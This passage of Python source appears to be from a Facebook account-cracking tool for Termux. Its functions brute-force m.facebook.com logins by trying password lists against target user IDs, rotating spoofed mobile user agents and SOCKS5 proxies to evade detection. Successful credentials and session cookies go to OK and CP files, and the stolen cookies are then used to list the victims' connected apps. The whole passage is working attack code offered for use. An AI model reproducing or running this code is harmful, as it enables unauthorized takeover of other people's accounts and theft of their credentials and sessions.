	ua = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) coc_coc_browser/83.0.214 CriOS/77.0.3865.214 Mobile/15E148 Safari/605.1','Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) coc_coc_browser/83.0.214 CriOS/77.0.3865.214 Mobile/15E148 Safari/605.1','Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) coc_coc_browser/83.0.194 CriOS/77.0.3865.194 Mobile/15E148 Safari/605.1','Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) coc_coc_browser/83.0.194 CriOS/77.0.3865.194 Mobile/15E148 Safari/605.1'])
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=True,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}|{tahun(idf)}\n[bold yellow]{ua}",width=70,title=f"[bold yellow] BAZ CP ",style=f"{warna_kolor}"))
				os.popen('play-audio bazcp.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36"}
				if 'no' in aplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					cetak(panel(f"[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}[/]",width=70,title=f"[bold green] BAZ OK ",style=f"{warna_kolor}"))
					os.popen('play-audio bazok.mp3')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in aplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					os.popen('play-audio bazok.mp3')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold green]APLIKASI MASIH AKTIF [/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow]APLIKASI KADALUARSA [/bold red]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					oke = f'[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}\n[bold green]{infoakun}[/]'
					oke2 = panel(oke, style='green')
					cetak(panel(oke2, title='[bold green]BAZ OK[/bold green]'))
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
# validate 1
def crackf(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[[cyan]validate[white]] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugenf)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/login/save-device/'"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https:/m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}|{tahun(idf)}\n[bold yellow]{ua}",width=70,title=f"[bold yellow] BAZ CP ",style=f"{warna_kolor}"))
				os.popen('play-audio bazcpf.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36"}
				if 'no' in aplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					cetak(panel(f"[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}[/]",width=70,title=f"[bold green] BAZ OK ",style=f"{warna_kolor}"))
					os.popen('play-audio bazok.mp3')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in aplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					os.popen('play-audio bazok.mp3')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold green]APLIKASI MASIH AKTIF [/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow]APLIKASI KADALUARSA [/bold red]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					oke = f'[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}\n[bold green]{infoakun}[/]'
					oke2 = panel(oke, style='green')
					cetak(panel(oke2, title='[bold green]BAZ OK[/bold green]'))
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
# validate 2
def crackz(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[[cyan]validate[white]] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugenz)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			pw = pw.lower()
			ses = requests.Session()
			header1 = {
				"Host": "m.facebook.com",
				"cache-control": "max-age=0",
				"upgrade-insecure-requests": "1",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with": "mark.via.gp",
				"sec-fetch-site": "none",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"referer": "https://developers.facebook.com/",
				"accept-encoding": "gzip, deflate",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
			z = ses.get("https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ1NTE3NDA0LCJjYWxsc2l0ZV9pZCI6Mjc2MjMwNjIxNzQyMjQ4NX0%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2F%3Flocale%3Did_ID&refsrc=deprecated&_rdr", headers=header1)
			dt = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(z.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(z.text)).group(1),
				"uid":idf,
				"flow":"login_no_pin",
				"pass":pw,
				"next":"https://developers.facebook.com/?locale=id_ID"
			}
			header2 = {
				"Host": "m.facebook.com",
				"content-length": "129",
				"cache-control": "max-age=0",
				"upgrade-insecure-requests": "1",
				"origin": "https://m.facebook.com",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with": "mark.via.gp",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"referer": "https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ1NTE3NDA0LCJjYWxsc2l0ZV9pZCI6Mjc2MjMwNjIxNzQyMjQ4NX0%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2F%3Flocale%3Did_ID&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
			j = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dt, headers = header2, allow_redirects = True)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}|{tahun(idf)}\n[bold yellow]{ua}",width=70,title=f"[bold yellow] BAZ CP ",style=f"{warna_kolor}"))
				os.popen('play-audio bazcpz.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36"}
				if 'no' in aplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					cetak(panel(f"[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}[/]",width=70,title=f"[bold green] BAZ OK ",style=f"{warna_kolor}"))
					os.popen('play-audio bazok.mp3')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in aplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					os.popen('play-audio bazok.mp3')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold green]APLIKASI MASIH AKTIF [/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow]APLIKASI KADALUARSA [/bold red]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					oke = f'[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}\n[bold green]{infoakun}[/]'
					oke2 = panel(oke, style='green')
					cetak(panel(oke2, title='[bold green]BAZ OK[/bold green]'))
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
# sistem_kontrol
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	lisensi()
